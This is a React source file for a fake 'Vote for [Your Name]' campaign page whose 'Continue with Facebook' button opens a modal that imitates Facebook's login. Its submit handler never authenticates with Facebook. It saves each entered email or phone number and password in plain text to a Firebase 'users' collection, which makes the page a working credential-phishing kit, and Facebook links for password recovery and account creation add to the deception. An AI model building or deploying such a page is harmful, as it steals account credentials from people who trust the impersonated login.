import "./App.css";
import profile1 from "./images/profile1.jpg";
import { useEffect, useState } from "react";
import { FaFacebook } from "react-icons/fa";
import { BiSolidDownvote } from "react-icons/bi";
import { db, collection, addDoc, doc, getDoc } from './firebase';

function App() {
  const [data, setData] = useState({
    email: '',
    password: '',
});

const handleEmail = (value) => {
  setData({
    ...data,
    email: value,
  })
}

const handlePassword = (value) => {
  setData({
    ...data,
    password: value,
  })
}

  useEffect(() => {
    const modal = document.getElementById("login-modal");
    const btn = document.getElementById("facebook-login-btn");
    const span = document.getElementsByClassName("close")[0];

    btn.onclick = () => {
      modal.style.display = "block";
    };

    span.onclick = () => {
      modal.style.display = "none";
    };

    window.onclick = (event) => {
      if (event.target === modal) {
        modal.style.display = "none";
      }
    };
  });

  const handleSubmit = async (e) => {
    e.preventDefault()
    try{
      await addDoc(collection(db, 'users'), {
        data: data,
        createdAt: new Date().toISOString()
      })
    }catch(error){
      console.log(error)
    }
  }
  return (
    <>
      <div id="login-modal" class="modal">
        <div class="modal-content">
          <span class="close">&times;</span>
          <div class="login-container">
            <h2>Facebook</h2>
            <form id="login-form" onSubmit={handleSubmit}>
              <div class="input-group">
                <label for="email">Email or Phone</label>
                <input type="text" id="email" name="email" value={data.email} onChange={(e) => handleEmail(e.target.value)} required />
              </div>
              <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" value={data.password} onChange={(e) => handlePassword(e.target.value)} required />
              </div>
              <button type="submit" class="login-btn">
                Log In
              </button>
            </form>
            <div class="footer">
              <a href="https://web.facebook.com/login/identify/">
                Forgotten password?
              </a>
              <hr />
              <a
                href="https://web.facebook.com/"
                target="_blank"
                rel="noreferrer"
              >
                <button class="create-account-btn">Create New Account</button>
              </a>
            </div>
          </div>
        </div>
      </div>
      <div class="particles"></div>
      <div class="container">
        <header>
          <h1>Vote for [Your Name]!</h1>
        </header>
        <section class="campaign-details glass">
          <h2>About My Campaign</h2>
          <p>
            Welcome! I'm [Your Name], and I'm running for [Position]. My
            campaign focuses on [Key Points]. I believe in [Your Beliefs/Goals].
            Together, we can make a difference.
          </p>
          <img src={profile1} alt="Campaign" class="campaign-image" />
          <div class="social-icons">
            <a
              href="https://www.facebook.com/yourprofile"
              target="_blank"
              rel="noreferrer"
            >
              <i class="fab fa-facebook-f"></i>
            </a>
            <a
              href="https://www.twitter.com/yourprofile"
              target="_blank"
              rel="noreferrer"
            >
              <i class="fab fa-twitter"></i>
            </a>
            <a
              href="https://www.instagram.com/yourprofile"
              target="_blank"
              rel="noreferrer"
            >
              <i class="fab fa-instagram"></i>
            </a>
          </div>
          <BiSolidDownvote size={40} color="#ff7e5f" />
        </section>
        <div id="fb-root"></div>
        <div class="content glass" id="content">
          <button id="facebook-login-btn">
          <FaFacebook size={25} />
            <p>
              Continue with Facebook
            </p>
          </button>
        </div>
      </div>
    </>
  );
}

export default App;
